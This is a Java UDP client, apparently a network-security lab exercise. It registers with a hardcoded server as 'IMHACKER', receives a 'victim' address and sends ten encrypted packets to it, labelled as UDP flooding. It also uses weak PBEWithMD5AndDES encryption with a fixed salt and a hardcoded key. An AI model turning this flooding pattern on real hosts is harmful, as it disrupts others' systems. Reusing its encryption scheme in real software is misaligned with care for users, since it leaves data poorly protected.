package hanClt;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;

import javax.crypto.*;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;


public class HanClient {
	
	 private final static int PACKETSIZE = 100 ;
	 static Cipher ecipher;
	    Cipher dcipher;
	    // 8-byte Salt
	    static byte[] salt = {
	        (byte) 0xA9, (byte) 0x9B, (byte) 0xC8, (byte) 0x32,
	        (byte) 0x56, (byte) 0x35, (byte) 0xE3, (byte) 0x03
	    };
	    // Iteration count
	    static int iterationCount = 19;
	    
	    public HanClient() {
	    
	    }

	 public static String encrypt(String secretKey, String plainText) 
			 	throws NoSuchAlgorithmException,
	            InvalidKeySpecException,
	            NoSuchPaddingException,
	            InvalidKeyException,
	            InvalidAlgorithmParameterException,
	            UnsupportedEncodingException,
	            IllegalBlockSizeException,
	            BadPaddingException {
	        //Key generation for enc and desc
	        KeySpec keySpec = new PBEKeySpec(secretKey.toCharArray(), salt, iterationCount);
	        SecretKey key = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
	        // Prepare the parameter to the ciphers
	        AlgorithmParameterSpec paramSpec = new PBEParameterSpec(salt, iterationCount);

	        //Enc process
	        ecipher = Cipher.getInstance(key.getAlgorithm());
	        ecipher.init(Cipher.ENCRYPT_MODE, key, paramSpec);
	        String charSet = "UTF-8";
	        byte[] in = plainText.getBytes(charSet);
	        byte[] out = ecipher.doFinal(in);
	        String encStr = new String(Base64.getEncoder().encode(out));
	        return encStr;
	    }

	 
	   public static void main( String args[] ) {
		   
		System.out.println("#####     Starting program     #####");
		
		DatagramSocket socket = null ;

	      try {
	         // Convert the arguments first, to ensure that they are valid
	         InetAddress host = InetAddress.getByName("114.70.37.17") ;
	         int port         = Integer.parseInt("10004") ;

	         // Construct the socket
	         socket = new DatagramSocket() ;

	         // Construct the datagram packet
	         String plain = "IMHACKER_2015111514";
	         byte [] data = plain.getBytes() ;
	         DatagramPacket packet = new DatagramPacket( data, data.length, host, port ) ;

	         System.out.println("\n#####     Sendimg data to server     #####");
	         System.out.println("Sended data -> " + plain);
	         // Send it
	         socket.send( packet ) ;

	 		 System.out.println("\n#####     Receiving data from server     #####");

	         // Prepare the packet for receive
	         packet.setData( new byte[PACKETSIZE] ) ;

	         // Wait for a response from the server
	         socket.receive( packet ) ;

	         // Print the response
	         
	         String receiveStr = new String(packet.getData());
	         
	         System.out.println("Recieved data -> " + receiveStr ) ;
	         
	         System.out.println("#####     Extracting IP and Port     #####");
  
	         int idx1 = receiveStr.indexOf("_");
	         int idx2 = receiveStr.indexOf(":");
	         
	         String str_victim = receiveStr.substring(idx1+1, idx2);
	         System.out.println("victim's IP -> " + str_victim);
	         
	         String str_vport = receiveStr.substring(idx2+1, receiveStr.length()-1);
	         System.out.println("victim's Port -> " + str_vport);
	         
	         InetAddress victim = InetAddress.getByName(str_victim);
	         
	         //int vport = Integer.parseInt(str_vport);
	         int vport = Integer.parseInt("7777");
	         
	         // Construct the datagram packet         
	         
	         System.out.println("#####     Encrypting Data     #####");
	         
	         String key = "HannaNo";
	         plain = "2015111514";
	         
	         System.out.println("Plain Text -> " + plain);
	         
	         String enc = encrypt(key, plain);
	         data = enc.getBytes() ;
	         
	         System.out.println("Encrypted Data -> " + enc);

	         System.out.println("\n#####     UDP Flooding     #####");
	         
	         packet = new DatagramPacket( data, data.length, victim, vport ) ;
	         
	         for(int i=0; i<10; i++) { 
	        	 socket.send( packet ); 
	        	 System.out.println("sending Data -> " + enc); 
	        	 }
	         
	         System.out.println("\n####     Finishing Connetcion     ####");
	         
	      } catch( Exception e ) {
	         System.out.println( e ) ;
	      } finally {
	         if( socket != null )
	            socket.close() ;
	      }
	      
	   }
}
